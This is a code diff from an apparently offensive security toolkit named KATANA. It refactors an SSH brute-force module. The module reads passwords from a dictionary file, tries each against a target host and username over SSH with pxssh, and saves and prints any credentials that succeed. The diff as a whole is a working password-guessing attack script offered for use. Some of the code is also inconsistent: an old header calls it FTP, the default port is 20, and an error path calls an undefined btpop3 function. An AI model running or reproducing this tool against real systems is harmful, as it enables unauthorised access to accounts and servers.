@@ -1,114 +1,107 @@
-# KATANA
-# FTP Brute Force
-# Script by LeSZO ZerO
-# 07/03/2015
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# @KATANA                       #
+# Modules   : SSH Brute Force   #
+# Script by : RedToor           #
+# Date      : 07/03/2015        #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Katana Core                   #
+from core.design import *       #
+from core import help           #
+from core import ping           #
+d=DESIGN()                      #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Libraries                     #
+import time                     #
+import optparse                 #
+import pxssh                    #
+import os                       #
+import sys                      #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Default                       #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+defaulthost="127.0.0.1"
+defaultport="22"
+defaultuser="admin"
+defaultdicc="core/db/pass.dicc"
 
-from core import help
-import time
-import optparse
-import pxssh
-import os
-import sys
-W  = '\033[0m'  
-R  = '\033[31m' 
-G  = '\033[32m' 
-O  = '\033[33m' 
-B  = '\033[34m' 
-P  = '\033[35m' 
-C  = '\033[36m' 
-GR = '\033[37m'
-defaulthost="localhost"
-defaultport="20"
-defaultdic1="core/db/user.dicc"
-defaultdic2="core/db/pass.dicc"
-def btssh():
+def run(para,parb,parc,pard):
+	global defaulthost,defaultport,defaultuser,defaultdicc
+	defaulthost=para
+	defaultport=parb
+	defaultuser=parc
+	defaultdicc=pard
+	btssh(1)
+
+def btssh(run):
 	try:
-		global defaulthost,defaultport,defaultdic1,defaultdic2
-		actions = raw_input(O+"     ktn/bt/ssh > "+W)
-		if actions == "show options":
+		global defaulthost,defaultport,defaultuser,defaultdicc
+		if run!=1:
+			actions=raw_input(d.prompt("bt/ssh"))
+		else:
+			actions="run"
+		if actions == "show options" or actions == "sop":
+			d.option()
+			d.descrip("target","yes","IP or DNS",defaulthost)
+			d.descrip("port","no","Port of target",defaultport)
+ 			d.descrip("user","yes","Username",defaultuser)
+ 			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
 			print ""
-			print "     ["+R+"+"+W+"] options"
-			print "     |target         : yes"
-			print "     |port           : no/yes"
-			print "     |dictionaries   : no/yes\n"
-			print ""
-			print "     ["+G+"+"+W+"] options current"
-			print "     |target         : ",defaulthost
-			print "     |port           : ",defaultport
-			print "     |dictionary_1   : ",defaultdic1
-			print "     |dictionary_2   : ",defaultdic2
-			print ""
-			btssh()
+			btssh(0)
 		elif actions[0:10] == "set target":
 			defaulthost = actions[11:]
 			defaulthost = defaulthost.replace("http://", "")
-			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
-			btssh()
+			d.change("target",defaulthost)
+			btssh(0)
 		elif actions[0:8] == "set port":
 			defaultport = actions[9:]
-			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
-			btssh()
-		elif actions[0:16] == "set dictionary_1":
-				defaultdic1 = actions[17:]
-				print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
-				btssh()
-		elif actions[0:16] == "set dictionary_2":
-				defaultdic2 = actions[17:]
-				print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
-				btssh()
-		elif actions=="back":
-			return 
-		elif actions=="exit":
-			print C+"     GooD"+W+" bye."
+			d.change("port",defaultport)
+			btssh(0)
+		elif actions[0:8] == "set user":
+			defaultuser = actions[9:]
+			d.change("user",defaultuser)
+			btssh(0)
+		elif actions[0:10] == "set dict_1":
+			defaultdicc = actions[11:]
+			d.change("dict_1",defaultdicc)
+			btssh(0)
+		elif actions=="exit" or actions=="x":
+			d.goodbye()
 			exit()
-		elif actions == "help":
+		elif actions=="help" or actions=="h":
 			help.help()
-		if actions == "run":
-			print("\n     ["+O+"!"+W+"] Checking file")
-			if True:
+		elif actions=="back" or actions=="b":
+			return
+			return
+		elif actions=="run"  or actions=="r":
+			d.run()
+			try:
+				ping.live(defaulthost,defaultport)
 				if True:
-					print "     ["+G+"+"+W+"] options current"
-					print "     target         : ",defaulthost
-					print "     port           : ",defaultport
-					print "     dictionary_1   : ",defaultdic1
-					print "     dictionary_2   : ",defaultdic2
-					print ""
 					try:
-						#ftp = FTP(defaulthost)
-						if True:
-							print("     ["+G+"+"+W+"] target LIVE")
-							print("     ["+G+"+"+W+"] Running")
-							try:
-								with open(defaultdic1,'r') as user:
-									for us in user: 
-										with open(defaultdic2,'r') as passs:
-											for ps in passs:
-												us=us.replace("\n","")
-												ps=ps.replace("\n","")
-												try:
-													connect = pxssh.pxssh()
-													connect.login(defaulthost,us,ps)
-													if True:
-														log=open('core/logs/logsBruteForce.log','a')
-														log.write('\n ===================================== ')
-														log.write('\n Module  : BruteForceSSH')
-														log.write('\n Data    : '+time.strftime('%c'))
-														log.write('\n target  : '+defaulthost)
-														log.write('\n port    : '+defaultport)
-														log.write('\n Cracked : username : '+us+' , password : '+ps)
-														log.close()
-														print "     ["+G+"+"+W+"] Successfully with username : "+us+" , password : "+ps+"\n"
-														return
-												except(KeyboardInterrupt, SystemExit):
-													print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
-												except:
-													print "     ["+O+"!"+W+"] Checking with username : "+us+" , password : "+ps						
-							except(KeyboardInterrupt, SystemExit):
-								print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
+						d.loading()
+						try:
+							with open(defaultdicc,'r') as passs:
+								for ps in passs:
+									ps=ps.replace("\n","")
+									try:
+										connect = pxssh.pxssh()
+										connect.login(defaulthost,defaultuser,ps)
+										if True:
+											ping.save("BruteForceSSH",defaulthost,defaultport,defaultuser,ps)
+											print "\n-"+Suf+" Successfully with ("+defaultuser+"="+ps+")\n"
+											return 1
+									except:
+										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
+						except:
+							d.filenot(defaultdicc)
+							btpop3(0)
 					except:
-						print("     ["+R+"-"+W+"] target off")
+						d.kbi()
+			except:
+				d.off()
 		else:
-			print "     ["+O+"!"+W+"] command No Accept"+W
-	except(KeyboardInterrupt, SystemExit):
-		print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
-	btssh()
+			d.nocommand()
+	except:
+		d.kbi()
+		exit()
+	btssh(0)
